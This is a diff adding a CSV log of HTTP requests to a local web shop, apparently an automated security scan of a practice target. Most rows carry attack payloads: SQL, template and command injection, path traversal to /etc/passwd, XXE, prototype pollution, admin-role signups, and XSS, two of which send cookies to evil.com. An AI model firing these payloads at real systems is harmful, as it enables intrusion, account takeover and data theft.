@@ -1,0 +1,500 @@
+_id,signature,body_bytes,ip,request.method,request.path,request.protocol,request_body,status,timestamp
+1e55b8907b9eda146575eb5b,bae2cd6c1898ec99,96,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWGeoQ,HTTP/1.1,,200,2025-12-02T23:40:49+0530
+9c0c63d5dd0b991b56bfbcdd,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWGex7&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,40,200,2025-12-02T23:40:49+0530
+d8f734245f8d08d997336a9b,44b4e5901a7362ef,32,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWGeyB&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:40:49+0530
+a1fc182632091d36b82ae70d,0aa919e8a17501d9,45,127.0.0.1,GET,/socket.io/?EIO=4&transport=websocket&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,400,2025-12-02T23:40:50+0530
+85dad2b61652f38264060f7d,616ade6340ef5d91,9015,127.0.0.1,GET,/assets/file:///etc/passwd,HTTP/1.1,,200,2025-12-02T23:40:57+0530
+c4b05a582d127d1843f1ce47,55af35de850dcbd1,343,127.0.0.1,POST,/rest/user/change-password,HTTP/1.1,"{\x22current\x22: \x22oldpassword\x22, \x22new\x22: \x22hacked123\x22, \x22repeat\x22: \x22hacked123\x22}",500,2025-12-02T23:40:59+0530
+3f6c4570851dd68aad87bd02,bbf0ebe25ab69b46,9015,127.0.0.1,PUT,/etc/passwd%2500.jpg,HTTP/1.1,{\x22name\x22: \x22hacked\x22},200,2025-12-02T23:41:00+0530
+18655a183dddcd2055786c5a,eeaae0a7260adcd2,245,127.0.0.1,DELETE,/api/BasketItems/1%3B%20DROP%20TABLE%20users%3B--,HTTP/1.1,,401,2025-12-02T23:41:01+0530
+531e8946367c1b3d145c959c,f7ed366bd59709e3,31,127.0.0.1,GET,/api/Cards?UserId=32,HTTP/1.1,,401,2025-12-02T23:41:02+0530
+d8a1882cef64e2bd9bf20251,0a03c19f3929936e,337,127.0.0.1,POST,/api/Users,HTTP/1.1,"{\x22email\x22: \x22' UNION SELECT username, password FROM users--\x22, \x22password\x22: \x22test1234\x22, \x22passwordRepeat\x22: \x22test1234\x22, \x22securityQuestion\x22: {\x22id\x22: 1}, \x22securityAnswer\x22: \x22' UNION SELECT username, password FROM users--\x22}",201,2025-12-02T23:41:03+0530
+47d9cc443dd3f93d663a8812,8e25c7d877be893e,31,127.0.0.1,PUT,/api/Addresss/53,HTTP/1.1,"{\x22city\x22: \x22<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>\x22, \x22streetAddress\x22: \x22<img src=x onerror=fetch('http://evil.com/?c='+document.cookie)>\x22}",401,2025-12-02T23:41:05+0530
+2a39cdd132cf80ed97582f6b,6374e4221a459d48,341,127.0.0.1,DELETE,/api/Products/expect%3A//id,HTTP/1.1,,500,2025-12-02T23:41:06+0530
+90dac987683427221443eab1,8fb1208454dd5605,30,127.0.0.1,GET,/rest/products/search?q=value%0D%0AX-Injected%3A%20header,HTTP/1.1,,200,2025-12-02T23:41:07+0530
+bd18898e5e32d433822e4154,0a03c19f3929936e,293,127.0.0.1,POST,/api/Users,HTTP/1.1,"{\x22__proto__\x22: {\x22isAdmin\x22: true}, \x22constructor\x22: {\x22prototype\x22: {\x22isAdmin\x22: true}}}",201,2025-12-02T23:41:09+0530
+02c1880de4657781a4c66883,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/849,HTTP/1.1,{\x22quantity\x22: 0},401,2025-12-02T23:41:11+0530
+489a863b6a573ebefd1de2e0,fd67f1949606304f,245,127.0.0.1,DELETE,/api/BasketItems/1%20OR%201%3D1,HTTP/1.1,,401,2025-12-02T23:41:13+0530
+03ede24a7e6d8acf0c97b6cb,0d392679e36d64f2,2992,127.0.0.1,GET,/rest/products/search?q=juice&order=name%3B%20DROP%20TABLE%20users%3B--,HTTP/1.1,,200,2025-12-02T23:41:14+0530
+d07a1ffdcc31c549794b2581,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWGez9&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:41:14+0530
+af9048778d5fdf24e0b4bc65,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWGl1B&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:41:14+0530
+79b26a4f389a32c5f1df3877,5a9b9819458d22ab,42,127.0.0.1,POST,/api/Feedbacks,HTTP/1.1,"{\x22comment\x22: \x22<%= 7*7 %>\x22, \x22rating\x22: 5, \x22captcha\x22: \x221\x22, \x22captchaId\x22: 1}",401,2025-12-02T23:41:15+0530
+711284528a0d10c82264552e,e70c3b4340d087ad,9015,127.0.0.1,PUT,/etc/passwd%2500,HTTP/1.1,{\x22name\x22: \x22hacked\x22},200,2025-12-02T23:41:16+0530
+b5477e93996f3089e2525844,eeaae0a7260adcd2,245,127.0.0.1,DELETE,/api/BasketItems/1%3B%20DROP%20TABLE%20users%3B--,HTTP/1.1,,401,2025-12-02T23:41:17+0530
+8b7487a0fdd1ead332459355,d019c048264c6a70,30,127.0.0.1,GET,/rest/products/search?q=admin%29%28%7C%28password%3D%2A%29%29,HTTP/1.1,,200,2025-12-02T23:41:19+0530
+60def1f7e1c5a0a86d4bea04,0a03c19f3929936e,293,127.0.0.1,POST,/api/Users,HTTP/1.1,"{\x22__proto__\x22: {\x22isAdmin\x22: true}, \x22constructor\x22: {\x22prototype\x22: {\x22isAdmin\x22: true}}}",201,2025-12-02T23:41:21+0530
+571c589bb5a0021fd043d30b,8e25c7d877be893e,31,127.0.0.1,PUT,/api/Addresss/75,HTTP/1.1,"{\x22city\x22: \x22%3Cscript%3Ealert('XSS')%3C/script%3E\x22, \x22streetAddress\x22: \x22%3Cscript%3Ealert('XSS')%3C/script%3E\x22}",401,2025-12-02T23:41:22+0530
+5487eff0655172dbeb098a53,fd67f1949606304f,245,127.0.0.1,DELETE,/api/BasketItems/1%20OR%201%3D1,HTTP/1.1,,401,2025-12-02T23:41:24+0530
+138c8de60147139cfcb8d3a2,d019c048264c6a70,30,127.0.0.1,GET,/rest/products/search?q=admin%29%28%7C%28password%3D%2A%29%29,HTTP/1.1,,200,2025-12-02T23:41:25+0530
+7aa68d64b5b311d919c5358b,5a9b9819458d22ab,42,127.0.0.1,POST,/api/Feedbacks,HTTP/1.1,"{\x22comment\x22: \x22' UNION SELECT NULL, NULL, NULL--\x22, \x22rating\x22: 5, \x22captcha\x22: \x221\x22, \x22captchaId\x22: 1}",401,2025-12-02T23:41:26+0530
+4a518a3b1462c02ab6f6976e,8e25c7d877be893e,31,127.0.0.1,PUT,/api/Addresss/95,HTTP/1.1,"{\x22city\x22: \x22<iframe src=javascript:alert('XSS')>\x22, \x22streetAddress\x22: \x22<iframe src=javascript:alert('XSS')>\x22}",401,2025-12-02T23:41:27+0530
+25de03f0aaee9642f79b9801,84e6c983495330a9,245,127.0.0.1,DELETE,/api/Products/1,HTTP/1.1,,401,2025-12-02T23:41:28+0530
+7401342add10305c458d277e,6dfb50b9b96f7679,2992,127.0.0.1,GET,/rest/products/search?q=juice&order=1%2C2%2C3%2C4%2C5--,HTTP/1.1,,200,2025-12-02T23:41:28+0530
+e6b381cd57b50e124f3ede44,5a20be4ce1a94dc4,31,127.0.0.1,POST,/api/Addresss,HTTP/1.1,"{\x22fullName\x22: \x22&#60;script&#62;alert('XSS')&#60;/script&#62;\x22, \x22mobileNum\x22: \x221234567890\x22, \x22zipCode\x22: \x2212345\x22, \x22streetAddress\x22: \x22&#60;script&#62;alert('XSS')&#60;/script&#62;\x22, \x22city\x22: \x22&#60;script&#62;alert('XSS')&#60;/script&#62;\x22, \x22state\x22: \x22XS\x22, \x22country\x22: \x22&#60;script&#62;alert('XSS')&#60;/script&#62;\x22}",401,2025-12-02T23:41:30+0530
+8e8409f6d63f5342f4ed729a,8e25c7d877be893e,31,127.0.0.1,PUT,/api/Addresss/63,HTTP/1.1,"{\x22city\x22: \x22<div onmouseover=alert('XSS')>hover me</div>\x22, \x22streetAddress\x22: \x22<div onmouseover=alert('XSS')>hover me</div>\x22}",401,2025-12-02T23:41:32+0530
+afa06ebfb56cd84ab710fa09,84e6c983495330a9,245,127.0.0.1,DELETE,/api/Products/1,HTTP/1.1,,401,2025-12-02T23:41:34+0530
+173af19f3318afddc31dc630,0d392679e36d64f2,2992,127.0.0.1,GET,/rest/products/search?q=juice&order=name%3B%20DROP%20TABLE%20users%3B--,HTTP/1.1,,200,2025-12-02T23:41:37+0530
+ef965e2e5378e5d6822d7f22,55af35de850dcbd1,343,127.0.0.1,POST,/rest/user/change-password,HTTP/1.1,"{\x22current\x22: \x22oldpassword\x22, \x22new\x22: \x22hacked123\x22, \x22repeat\x22: \x22hacked123\x22}",500,2025-12-02T23:41:38+0530
+74ac72748ee083ffee6054ff,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/83,HTTP/1.1,{\x22quantity\x22: \x22admin'--\x22},401,2025-12-02T23:41:39+0530
+35e3ff00cbd656f33b458460,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWGl1H&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:41:39+0530
+6b007eeb2d6baabc69e466a2,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWGr7f&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:41:39+0530
+b2c93e13b6c70dfbb48b964e,aa911f36222579a4,245,127.0.0.1,DELETE,/api/Users/919,HTTP/1.1,,401,2025-12-02T23:41:40+0530
+490b8b8b5cab5c81caaf1b7c,a38db79d01ac3b4f,30,127.0.0.1,GET,/rest/products/search?q=value%0D%0A%0D%0A%3Chtml%3Einjected%3C/html%3E,HTTP/1.1,,200,2025-12-02T23:41:42+0530
+42121e9fe19e2b960d7a40b6,5a9b9819458d22ab,42,127.0.0.1,POST,/api/Feedbacks,HTTP/1.1,"{\x22comment\x22: \x22<audio src=x onerror=alert('XSS')>\x22, \x22rating\x22: 5, \x22captcha\x22: \x221\x22, \x22captchaId\x22: 1}",401,2025-12-02T23:41:44+0530
+b0fd4ac508b1eb3ad2507661,19d865dad9949bdc,157,127.0.0.1,PUT,/api/Products/..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,HTTP/1.1,,400,2025-12-02T23:41:45+0530
+5ada0c8b83f3a82f1d12545f,aa911f36222579a4,245,127.0.0.1,DELETE,/api/Users/420,HTTP/1.1,,401,2025-12-02T23:41:48+0530
+1ccf1b93fb1c4b9cb97f68dd,296b3a1de93bdfad,30,127.0.0.1,GET,/rest/products/search?q=%2A%29%28uid%3D%2A%29%29%28%7C%28uid%3D%2A,HTTP/1.1,,200,2025-12-02T23:41:50+0530
+332feb01bd137d9f12aae8e3,5a9b9819458d22ab,42,127.0.0.1,POST,/api/Feedbacks,HTTP/1.1,"{\x22comment\x22: \x22<<script>alert('XSS');//<</script>\x22, \x22rating\x22: 5, \x22captcha\x22: \x221\x22, \x22captchaId\x22: 1}",401,2025-12-02T23:41:51+0530
+d99b68d51829de98c1bf7612,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/57,HTTP/1.1,{\x22quantity\x22: \x221' AND SLEEP(5) AND '1'='1\x22},401,2025-12-02T23:41:53+0530
+832ff6e45f6efa354d8bf20d,f4bf5052de3f3a3b,31,127.0.0.1,DELETE,/api/Cards/997,HTTP/1.1,,401,2025-12-02T23:41:54+0530
+621458e78a056fdb46a9bf65,51b50c6144058eec,30,127.0.0.1,GET,/rest/products/search?q=value%0ASet-Cookie%3A%20malicious%3Dcookie,HTTP/1.1,,200,2025-12-02T23:41:55+0530
+7da60912bb83f56048a91d81,0a03c19f3929936e,293,127.0.0.1,POST,/api/Users,HTTP/1.1,"{\x22__proto__\x22: {\x22isAdmin\x22: true}, \x22constructor\x22: {\x22prototype\x22: {\x22isAdmin\x22: true}}}",201,2025-12-02T23:41:57+0530
+1203154e1eae785a7090ab1c,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/17,HTTP/1.1,{\x22quantity\x22: \x22admin'-- \x22},401,2025-12-02T23:41:57+0530
+2deb7b37951a1c611c46e7c3,aa911f36222579a4,245,127.0.0.1,DELETE,/api/Users/1,HTTP/1.1,,401,2025-12-02T23:41:59+0530
+adf092ddfb6369c5594d816f,1d8c3cc2b722f935,8656,127.0.0.1,GET,/api/Challenges,HTTP/1.1,,200,2025-12-02T23:42:00+0530
+c969b9da466813b76e33a2ab,f8c6500be76cdb86,245,127.0.0.1,POST,/api/Complaints,HTTP/1.1,"{\x22message\x22: \x22data:text/html,<script>alert('XSS')</script>\x22}",401,2025-12-02T23:42:01+0530
+29be4a1d90de0d237b3ebd09,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/276,HTTP/1.1,{\x22quantity\x22: 0},401,2025-12-02T23:42:03+0530
+dbd454d89ecc40d644111af6,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWGr7h&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:42:04+0530
+11d0b787c54b82271157333e,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWGxDu&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:42:04+0530
+a51602edfbe3474b80fe041d,b5942554828baf1f,245,127.0.0.1,DELETE,/api/Challenges/1,HTTP/1.1,,401,2025-12-02T23:42:05+0530
+5838c5c3dc2031df985b33be,889753a312887039,30,127.0.0.1,GET,/api/Recycles/338,HTTP/1.1,,200,2025-12-02T23:42:07+0530
+46f3ebf309819bd0f704f142,44b4e5901a7362ef,251,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWGxDv&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:42:09+0530
+8b18484103ae8b5981b6dc76,0a03c19f3929936e,314,127.0.0.1,POST,/api/Users,HTTP/1.1,"{\x22email\x22: \x22attacker1070@evil.com\x22, \x22password\x22: \x22test1234\x22, \x22passwordRepeat\x22: \x22test1234\x22, \x22role\x22: \x22admin\x22, \x22isAdmin\x22: true, \x22totpSecret\x22: \x22\x22, \x22securityQuestion\x22: {\x22id\x22: 1}, \x22securityAnswer\x22: \x22test\x22}",201,2025-12-02T23:42:09+0530
+715fec615ed3e60edcd5ee40,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWGySB&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,"42[\x22notification received\x22,\x22adf858a9828123061257cba29e3f34da87b23962\x22]",200,2025-12-02T23:42:09+0530
+5496d0a286e37aedcb6f80ff,6f7d2cdf49b3a2c7,79,127.0.0.1,GET,/rest/continue-code,HTTP/1.1,,200,2025-12-02T23:42:09+0530
+6d4cdd4f5741240bf79310b3,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/55,HTTP/1.1,{\x22quantity\x22: \x22'; WAITFOR DELAY '0:0:5'--\x22},401,2025-12-02T23:42:10+0530
+08e0eaa2cd62ade2a0f7fbf9,5cb54163f1ef710e,359,127.0.0.1,DELETE,/api/Products/..%25255c..%25255c..%25255cwindows/win.ini,HTTP/1.1,,500,2025-12-02T23:42:11+0530
+0c1840800bc30103fb62a3cf,0ea299fb9f9b5b97,157,127.0.0.1,GET,/rest/products/download/..%5C..%5C..%5C..%5Cboot.ini,HTTP/1.1,,400,2025-12-02T23:42:12+0530
+1835f907f444075bb0cd984c,f8c6500be76cdb86,245,127.0.0.1,POST,/api/Complaints,HTTP/1.1,{\x22message\x22: \x22'\x5C\x22--></style></script><script>alert('XSS')</script>\x22},401,2025-12-02T23:42:16+0530
+26cd9984f87c438339c4f41e,b58a2d8f4a8b9853,358,127.0.0.1,PUT,/api/Products/..%25c0%25af..%25c0%25af..%25c0%25afetc/passwd,HTTP/1.1,{\x22name\x22: \x22hacked\x22},500,2025-12-02T23:42:17+0530
+fdc0b59adb2376008dd2d67f,f4bf5052de3f3a3b,31,127.0.0.1,DELETE,/api/Cards/227,HTTP/1.1,,401,2025-12-02T23:42:18+0530
+89b68a87b3d4d408096e572e,263c872b2a9fd913,157,127.0.0.1,GET,/assets/..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,HTTP/1.1,,400,2025-12-02T23:42:20+0530
+df240b3a23ad48a7433aa18e,e59a6dbe6ecf9d1f,245,127.0.0.1,POST,/api/BasketItems,HTTP/1.1,"{\x22ProductId\x22: 23, \x22BasketId\x22: 99, \x22quantity\x22: 999}",401,2025-12-02T23:42:23+0530
+61c388b977a04efefc6e6518,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/75,HTTP/1.1,{\x22quantity\x22: \x22{\x5C\x22$gt\x5C\x22: \x5C\x22\x5C\x22}\x22},401,2025-12-02T23:42:25+0530
+9bcf06f0f0dcbb66f9ee5ceb,aa911f36222579a4,245,127.0.0.1,DELETE,/api/Users/674,HTTP/1.1,,401,2025-12-02T23:42:26+0530
+84b52822aa23ef0148e08e54,d13f7b2873be8870,245,127.0.0.1,GET,/api/Users/15,HTTP/1.1,,401,2025-12-02T23:42:28+0530
+3c4d32e2f82fb9de27be25fe,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWGySD&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:42:29+0530
+b748aa44d2f01ffdacf81e5c,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWH1Jj&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:42:29+0530
+4f292f9934db7d1803a35079,0a03c19f3929936e,308,127.0.0.1,POST,/api/Users,HTTP/1.1,"{\x22email\x22: \x22test8215@test.com\x22, \x22password\x22: \x22test1234\x22, \x22passwordRepeat\x22: \x22test1234\x22, \x22securityQuestion\x22: {\x22id\x22: 1}, \x22securityAnswer\x22: \x22${T(java.lang.Runtime).getRuntime().exec('id')}\x22}",201,2025-12-02T23:42:29+0530
+d0cd6998b2473be5b3a73579,171faab99c2caf57,245,127.0.0.1,PUT,/api/Users/36,HTTP/1.1,"{\x22role\x22: \x22admin\x22, \x22isAdmin\x22: true, \x22password\x22: \x22hacked\x22}",401,2025-12-02T23:42:31+0530
+027dcc29ca84c62caf91d295,b5942554828baf1f,245,127.0.0.1,DELETE,/api/Challenges/1,HTTP/1.1,,401,2025-12-02T23:42:32+0530
+81f7a4c5a0571955687be094,0d392679e36d64f2,2992,127.0.0.1,GET,/rest/products/search?q=juice&order=name%3B%20DROP%20TABLE%20users%3B--,HTTP/1.1,,200,2025-12-02T23:42:33+0530
+91b93d448d409f50501f34a1,6f5ba217ef99aef1,0,127.0.0.1,POST,/file-upload,HTTP/1.1,--d976eb6fe02b198814cfae7cf851fd9d\x0D\x0AContent-Disposition: form-data; name=\x22file\x22; filename=\x22test& ls -la.jpg\x22\x0D\x0AContent-Type: image/jpeg\x0D\x0A\x0D\x0Afake image content\x0D\x0A--d976eb6fe02b198814cfae7cf851fd9d--\x0D\x0A,204,2025-12-02T23:42:34+0530
+ea169abdf4e01fc073f59ec4,44b4e5901a7362ef,234,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWH1Jn&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:42:34+0530
+e8bc491606be43bf8260c6ed,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWH2ei&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,"42[\x22notification received\x22,\x223ca7d41d1c903c5ae68c2f713c9f875db870aca0\x22]",200,2025-12-02T23:42:35+0530
+bd1b77e497cebd5c518bf968,6f7d2cdf49b3a2c7,79,127.0.0.1,GET,/rest/continue-code,HTTP/1.1,,200,2025-12-02T23:42:35+0530
+60453259350b8949b8786b0d,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/427,HTTP/1.1,{\x22quantity\x22: 0},401,2025-12-02T23:42:35+0530
+b26aa9f417b4f7a6a02319f0,eeaae0a7260adcd2,245,127.0.0.1,DELETE,/api/BasketItems/1%3B%20DROP%20TABLE%20users%3B--,HTTP/1.1,,401,2025-12-02T23:42:37+0530
+7f92c65b3bf2affc09de24a5,392a09f8ef31b5d6,367,127.0.0.1,GET,/rest/products/search?q=%27%20UNION%20SELECT%20NULL--,HTTP/1.1,,500,2025-12-02T23:42:40+0530
+d6a876f0ab2670d68e44268e,778309e6a2101665,464,127.0.0.1,POST,/rest/user/login,HTTP/1.1,"{\x22email\x22: \x22admin' #\x22, \x22password\x22: \x22anything\x22}",500,2025-12-02T23:42:42+0530
+6e957070b8340c30ac40fa5f,171faab99c2caf57,245,127.0.0.1,PUT,/api/Users/13,HTTP/1.1,"{\x22role\x22: \x22admin\x22, \x22isAdmin\x22: true, \x22password\x22: \x22hacked\x22}",401,2025-12-02T23:42:43+0530
+57d4ecc960036b9dff6d5d1c,b5942554828baf1f,245,127.0.0.1,DELETE,/api/Challenges/1,HTTP/1.1,,401,2025-12-02T23:42:44+0530
+6ccceba234783bde9e1606d9,a776551050b43969,362,127.0.0.1,GET,/rest/products/download/%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd,HTTP/1.1,,500,2025-12-02T23:42:44+0530
+8f5e3141234d24f055095475,0a03c19f3929936e,314,127.0.0.1,POST,/api/Users,HTTP/1.1,"{\x22email\x22: \x22attacker2928@evil.com\x22, \x22password\x22: \x22test1234\x22, \x22passwordRepeat\x22: \x22test1234\x22, \x22role\x22: \x22admin\x22, \x22isAdmin\x22: true, \x22totpSecret\x22: \x22\x22, \x22securityQuestion\x22: {\x22id\x22: 1}, \x22securityAnswer\x22: \x22test\x22}",201,2025-12-02T23:42:46+0530
+94268c6eb2a46a998262c841,8f2f26c305a84530,355,127.0.0.1,PUT,/api/Products/..%25252f..%25252f..%25252fetc/passwd,HTTP/1.1,{\x22name\x22: \x22hacked\x22},500,2025-12-02T23:42:47+0530
+eb3b599daaef6be6519ed934,e686cc4eff81387d,31,127.0.0.1,DELETE,/api/Addresss/340,HTTP/1.1,,401,2025-12-02T23:42:49+0530
+4e8d62090e6e51bcfc77afc1,a495a290c377d9c9,35,127.0.0.1,GET,/api/Products/1%3B%20DROP%20TABLE%20products%3B--,HTTP/1.1,,404,2025-12-02T23:42:51+0530
+c457d329f1e24832889f6df3,f8c6500be76cdb86,245,127.0.0.1,POST,/api/Complaints,HTTP/1.1,{\x22message\x22: \x22<script>new Image().src='http://evil.com/steal?c='+document.cookie</script>\x22},401,2025-12-02T23:42:53+0530
+20224a7e793c31c978c20458,5cf4c280d3fe0cba,245,127.0.0.1,PUT,/api/BasketItems/449,HTTP/1.1,{\x22quantity\x22: 0},401,2025-12-02T23:42:53+0530
+acfbfdd474a858ab0bdba70a,44b4e5901a7362ef,1,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWH2ej&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:42:54+0530
+86428e804d9110aab607a7d3,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWH7QI&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,3,200,2025-12-02T23:42:54+0530
+4e8b73c3aaa4a9900a7702d5,84e6c983495330a9,245,127.0.0.1,DELETE,/api/Products/329,HTTP/1.1,,401,2025-12-02T23:42:54+0530
+e4e9980bc0f6bcf984acaaf4,2d73cc46523f1cc6,337,127.0.0.1,GET,/api/Orders/577,HTTP/1.1,,500,2025-12-02T23:42:56+0530
+b9ee420dc385ea184e68f76f,105318df3d48eee2,614,127.0.0.1,POST,/file-upload,HTTP/1.1,--9ed22df03168ced51673c9a53ff30e19\x0D\x0AContent-Disposition: form-data; name=\x22file\x22; filename=\x22malicious.xml\x22\x0D\x0AContent-Type: application/xml\x0D\x0A\x0D\x0A<?xml version=\x221.0\x22?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \x22file:///etc/passwd\x22>]><foo>&xxe;</foo>\x0D\x0A--9ed22df03168ced51673c9a53ff30e19--\x0D\x0A,410,2025-12-02T23:42:57+0530
+e69ac06ea60a00f98348b9d9,44b4e5901a7362ef,275,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWH7QL&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:42:57+0530
+8550f21a1fdc7a4455e49170,6f7d2cdf49b3a2c7,79,127.0.0.1,GET,/rest/continue-code,HTTP/1.1,,200,2025-12-02T23:42:57+0530
+f3206a31ed9fd23bdf8cdc6f,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWH8Dw&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,"42[\x22notification received\x22,\x225fd213c8fc772846b262c307eaaa901340a195bb\x22]",200,2025-12-02T23:42:57+0530
+29ffdce3636c8836e8376736,44b4e5901a7362ef,330,127.0.0.1,GET,/socket.io/?EIO=4&transport=polling&t=PhWH8D-&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,,200,2025-12-02T23:42:57+0530
+5bb012aeeff28c19832e31c5,46ccae1427aa0955,2,127.0.0.1,POST,/socket.io/?EIO=4&transport=polling&t=PhWH8Eo&sid=SbspUjGrg7PI3q_MAAAI,HTTP/1.1,"42[\x22notification received\x22,\x225a196f6f8335ad860de5fd4597a69de8f23dbce8\x22]",200,2025-12-02T23:42:58+0530
+dcb911538b963f216b8f3cd0,dad927544b754aad,0,127.0.0.1,GET,/rest/continue-code,HTTP/1.1,,304,2025-12-02T23:42:58+0530
+d71bcf899511605264b9a54a,b58a2d8f4a8b9853,358,127.0.0.1,PUT,/api/Products/..%25c0%25af..%25c0%25af..%25c0%25afetc/passwd,HTTP/1.1,{\x22name\x22: \x22hacked\x22},500,2025-12-02T23:42:59+0530
+7b2ef3f4c910b156319259aa,84e6c983495330a9,245,127.0.0.1,DELETE,/api/Products/1,HTTP/1.1,,401,2025-12-02T23:43:00+0530
+d833b757ae09e347186a10b4,b7393456dcaeb089,381,127.0.0.1,GET,/rest/products/download/php%3A//filter/convert.base64-encode/resource%3Dindex.php,HTTP/1.1,,500,2025-12-02T23:43:01+0530
+e41b2764e1cfd01680651672,f8c6500be76cdb86,245,127.0.0.1,POST,/api/Complaints,HTTP/1.1,{\x22message\x22: \x22<audio src=x onerror=alert('XSS')>\x22},401,2025-12-02T23:43:02+0530
+99369768282e31b53361e54e,171faab99c2caf57,245,127.0.0.1,PUT,/api/Users/60,HTTP/1.1,"{\x22role\x22: \x22admin\x22, \x22isAdmin\x22: true, \x22password\x22: \x22hacked\x22}",401,2025-12-02T23:43:03+0530
+258a365a87cbd5d8475b0a61,b5942554828baf1f,245,127.0.0.1,DELETE,/api/Challenges/1,HTTP/1.1,,401,2025-12-02T23:43:04+0530
+b374c355ccf568a540933fad,e09a7283b1b6873d,411,127.0.0.1,GET,/rest/products/search?q=%26%2360%3Bscript%26%2362%3Balert%28%27XSS%27%29%26%2360%3B/script%26%2362%3B,HTTP/1.1,,500,2025-12-02T23:43:06+0530
+315edf77bef036ad209903ec,0a03c19f3929936e,304,127.0.0.1,POST,/api/Users,HTTP/1.1,{\x22email\x22: \x22test@test.com\x22},201,2025-12-02T23:43:07+0530
+4cd0ce813ec4a23cadc8ddce,19d865dad9949bdc,157,127.0.0.1,PUT,/api/Products/..%5C..%5C..%5C..%5Cwindows%5Cwin.ini,HTTP/1.1,,400,2025-12-02T23:43:08+0530
+c9e9621d5ad3d88833dd6588,36054f491ca82d19,30,127.0.0.1,DELETE,/api/Products/1,HTTP/1.1,,200,2025-12-02T23:43:11+0530
+1607380a4bd5ad98d0dbabb7,5e3ec4c156d5c833,30,127.0.0.1,GET,/api/Products?name=vbscript%3Amsgbox%28%27XSS%27%29,HTTP/1.1,,200,2025-12-02T23:43:13+0530
+7812c391ac44ccac26432e95,0a03c19f3929936e,308,127.0.0.1,POST,/api/Users,HTTP/1.1,"{\x22email\x22: \x22test6248@test.com\x22, \x22password\x22: \x22test1234\x22, \x22passwordRepeat\x22: \x22test1234\x22, \x22securityQuestion\x22: {\x22id\x22: 1}, \x22securityAnswer\x22: \x22{{self.__class__.__mro__[2].__subclasses__()}}\x22}",201,2025-12-02T23:43:14+0530
+6b45c45580c6bf993f53aa2b,64ce457672796caa,35,127.0.0.1,PUT,/api/Users/35,HTTP/1.1,"{\x22role\x22: \x22admin\x22, \x22isAdmin\x22: true, \x22password\x22: \x22hacked\x22}",404,2025-12-02T23:43:15+0530
+f3da5fe8f3657431e5f408ab,03adf89fb22921cd,347,127.0.0.1,DELETE,/api/Products/file%3A///etc/passwd,HTTP/1.1,,500,2025-12-02T23:43:17+0530
+da4f01ced23d981c01cdbe14,7c656c9228d78b14,371,127.0.0.1,GET,/rest/products/search?q=%3Csvg%20onload%3Dalert%28%27XSS%27%29%3E,HTTP/1.1,,500,2025-12-02T23:43:18+0530
+7cdf4e311cb66160b6021776,9dee84afa40fc670,26,127.0.0.1,POST,/rest/user/login,HTTP/1.1,"{\x22email\x22: \x22'; DELETE FROM users;--\x22, \x22password\x22: \x22anything\x22}",401,2025-12-02T23:43:19+0530
